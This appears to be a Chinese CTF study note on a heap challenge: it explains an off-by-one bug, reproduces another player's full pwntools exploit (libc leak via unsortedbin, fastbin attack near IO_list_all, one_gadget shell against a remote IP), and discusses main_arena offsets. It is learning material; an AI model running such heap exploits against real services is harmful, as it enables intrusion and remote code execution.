![image](57339077163445F487E998510F2E7BF3)

程序逻辑：

1. add 输入一个size > 0 , < 1023的值 ，可以多次分配堆空间，将堆空间和size保存到全局变量中。
2. edit 读取数据到堆区
3. update 读取数据到your_name 这里有offbyone漏洞。
4. show 打印堆中数据
5. delete 释放堆中数据，free后置0.


漏洞:

update 存在offbyone漏洞，覆盖存储堆的低字节。add可以使用fastbin任意地址攻击，开启了 full relro 不能修改got表 ，束手无策，没看懂 Kirin 师傅的exp 的用了哪种漏洞。 




```
from pwn import *

context.log_level="debug"
def new(size):
   p.sendlineafter(".exit\n","1")
   p.sendlineafter("size\n",str(size))

def delete():
   p.sendlineafter(".exit\n","2")

def show():
   p.sendlineafter(".exit\n","3")

def fake(note):
   p.sendlineafter(".exit\n","4")
   p.sendafter("name\n",note)

def edit(note):
   p.sendlineafter(".exit\n","5")
   p.sendafter("note\n",note)
#p=process("./pwn1")
p=remote("39.106.184.130",8090)
p.sendafter("name\n","kirin\n")
new(0x98)

#防止与top chunk合并
new(0x18)
fake("a"*0x30+"\x10")
delete()
#堆地址为NULL， 重新赋值并覆盖低字节。
new(0x18)
#泄露main_arena 地址
fake("a"*0x30+"\x30")
show()
libc_addr=u64(p.recv(6)+"\x00\x00")+0x7ffff7a0d000-0x7ffff7dd1b78

new(0x58)
delete()
new(0x68)
delete()
new(0x18)
new(0x98)
new(0x10)
#gdb.attach(p)
fake("a"*0x30+"\x40")
delete()
new(0x10)
fake("a"*0x30+"\x60")
#编辑0x98的块偏移量为3C6758 ，不晓得这是个啥， 打开IDA 有个IO_LIST_ALL 应该是IO
edit("a"*8+p64(libc_addr+0x3c67a8-0x40-0x10))

#0x98 unsortedbin 分配结束
new(0x78)
new(0x68)
delete()

#跳转到上个0xa0 的堆区
new(0x58)


fake("a"*0x30+"\xd0")
#修改0x70的的fd字段，且此时0x70 为free ，fastbin attack
edit(p64(libc_addr+0x3c67a8-0x43))

#fastbin 得到之前分配释放fastbin
new(0x68)

# 分配目标地址修改目标地址的数据
new(0x68)
edit("/bin/sh"+"\x00"*(0x33-7)+p64(libc_addr+0x45390))
# 这里free是为什么？
delete()
#gdb.attach(p)
p.interactive()
```

Q&A:
1.使用哪种漏洞进行利用？


![image](151A6249AF0A440198DD772D53FE9356)
有IO_list_all 可能是IO_FILE uses ， 没有做过相关漏洞利用。看看有没有师傅可以解释下的

2.为什么unsortedbin 泄露出libc 基址


在fastbin为空时，unsortbin的fd和bk指向自身main_arena中，该地址的相对偏移值存放在libc.so中，可以通过use after free后打印出main_arena的实际地址，结合偏移值从而得到libc的加载地址。
unsortbin的fd和bk指向自身main_arena+88，而main_arena存储在libc.so.6文件的.data段，通过这个偏移我们就可以获取libc的基址，这里我讲一下怎么找到main_arena+88的地址，首先使用IDA打开libc文件，然后搜索函数malloc_trim()，具体如下图所示。
https://blog.csdn.net/qq_38204481/article/details/82318227

![image](118A5F67C33C4ED0A79A6E433F5DB76C)

